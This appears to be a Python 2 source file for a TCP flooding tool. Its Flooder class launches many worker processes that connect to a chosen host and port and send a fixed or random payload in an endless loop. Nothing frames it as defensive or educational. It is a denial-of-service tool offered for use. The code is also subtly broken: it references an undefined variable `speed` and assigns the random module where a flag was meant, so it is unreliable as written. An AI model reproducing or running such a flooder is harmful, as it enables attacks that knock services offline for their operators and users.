import socket, threading, random, time, os, mutex
from multiprocessing import Process
from Events import *
from main import *

def randomString(length):
    allowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    string = ''.join(random.choice(allowedChars) for i in xrange(length))
    return string

class TCPWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id
        self.socket = socket.socket()
        self.socket.setblocking(1)

        self.flooder = flooder
        self.running = True
        self.floodCount = 0

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

    def stop(self):
        self.running = False

    def run(self):
        while self.running:
            try:
                self.socket.connect((self.flooder.host, self.flooder.port))
                print "thread", self.id, "connected"
                break
            except Exception as e:
                print "Couldn't connect:", e.args, self.flooder.host, self.flooder.port
                time.sleep(1)
                continue
            break


        while self.running:
            try:
                self.flooder.increaseFlood()
                self.socket.send(self.message)
                print "thread", self.id, "count", self.floodCount
                if self.flooder.wait != None and self.flooder.wait != False:
                    print "thread", self.id, "sleeping for", self.flooder.wait
                    time.sleep(self.flooder.wait)
            except Exception as e:
                print "Couldn't send message on thread", self.id, "because", e.args
                time.sleep(0.1)
                pass

class Flooder:

    def __init__(self, host, port, timeout, method, threads, subsite = None, message = None, Random = False, wait = None):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.method = method
        self.threadsAmount = threads
        self.__processes = []
        self.wait = wait
        self.speed = speed
        self.subsite = subsite
        self.message = message
        self.random = random
        self.threadId = 0
        self.__floodCount = 0
        self.__floodMutex = mutex.mutex()

        if method == TCP_METHOD:
            if message == None and random == False:
                print "Message missing, not starting."
                return
        if method == UDP_METHOD or method == HTTP_METHOD:
            print "Not yet implemented, not starting."
            return

    def start(self):
        if len(self.__processes) > 0:
            return

        for x in range(self.threadsAmount):
            p = TCPWorkerThread(self, self.threadId)
            self.threadId += 1
            self.__processes.append(p)
            p.start()

    def stop(self):
        while len(self.__processes) > 0:
            p = self.__processes.pop()
            p.terminate() #This will leave some defunct threads, but they will be reaped upon starting automatically.

        print "final floodcount:", self.__floodCount

    def floodCount(self):
        return self.__floodCount

    def increaseFlood(self):
        self.__floodMutex.lock()
        self.__floodCount += 1
        self.__floodMutex.unlock()
